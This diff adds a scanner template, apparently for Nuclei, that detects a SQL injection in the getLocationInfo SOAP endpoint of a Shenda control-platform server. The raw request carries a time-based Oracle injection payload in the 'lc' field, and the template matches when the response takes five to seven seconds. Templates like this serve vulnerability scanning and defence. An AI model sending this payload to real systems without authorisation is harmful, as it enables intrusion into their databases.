@@ -1,0 +1,41 @@
+id: poc-yaml-sendinfo-control-platform-server-getlocationinfo-sqli
+info:
+  name: 深大智能科技有限公司管控平台服务端 getLocationInfo SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+http:
+  - raw:
+      - |
+        POST /API.asmx HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: text/xml; charset=utf-8
+        SOAPAction: "http://tempuri.org/getLocationInfo"
+
+        <?xml version="1.0" encoding="utf-8"?>
+        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+          <soap:Body>
+            <getLocationInfo xmlns="http://tempuri.org/">
+              <lc>' OR 4155=(SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5)-- AodC</lc>
+              <isa>string</isa>
+            </getLocationInfo>
+          </soap:Body>
+        </soap:Envelope>
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "\"retdata\":"
+          - "getLocationInfoResponse"
+          - "getLocationInfoResult"
+      - type: word
+        part: header
+        words:
+          - "text/xml"
+      - type: dsl
+        dsl:
+          - "5 < duration && duration < 7"
